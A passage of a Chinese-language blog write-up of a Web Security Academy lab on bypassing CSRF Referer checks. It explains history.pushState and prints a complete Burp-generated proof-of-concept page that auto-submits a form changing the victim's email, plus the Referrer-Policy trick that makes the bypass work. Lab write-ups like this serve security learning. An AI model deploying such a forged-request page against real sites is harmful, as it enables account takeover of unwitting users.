+<p>通过上面标明，这里的validation，只需要在referer有application合法的域名，即可通过验证。</p>
+<p>②</p>
+<p>这里先说一个js的新函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history.pushState(state, title, url)</span><br></pre></td></tr></table></figure>
+
+<p><strong><code>history.pushState()</code></strong> 方法向当前浏览器会话的历史堆栈中添加一个状态（state）。</p>
+<p>statehe title暂时不管 null</p>
+<p>url是指定新历史记录条目的URL，新网址必须与当前网址相同 origin； 否则，<code>pushState()</code>将引发异常。</p>
+<p>This will cause the Referer header in the generated request to contain the URL of the target site in the query string</p>
+<p>我的理解就是，给浏览器添加一条新的历史记录。那么在访问新页面的时候，referer就是这个新历史记录的值。</p>
+<p>通过burp suite CSRF PoC generator</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/?ac491f081e2c95afc04c349c000b000f.web-security-academy.net&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!--这里就是从attacker的网页基础上，referer加上application合法domian值，使得验证可以通过--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://ac491f081e2c95afc04c349c000b000f.web-security-academy.net/my-account/change-email&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker6@hack.com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.forms[<span class="number">0</span>].submit();</span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>==别忘了在head加上<code>Referrer-Policy: unsafe-url</code>！！！！！！！！==</strong></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/10/21/insecure%20deserialization/" rel="prev" title="">
+                  <i class="fa fa-chevron-left"></i> 
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/10/26/DOM%20based/" rel="next" title="">
+                   <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">H01iday</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
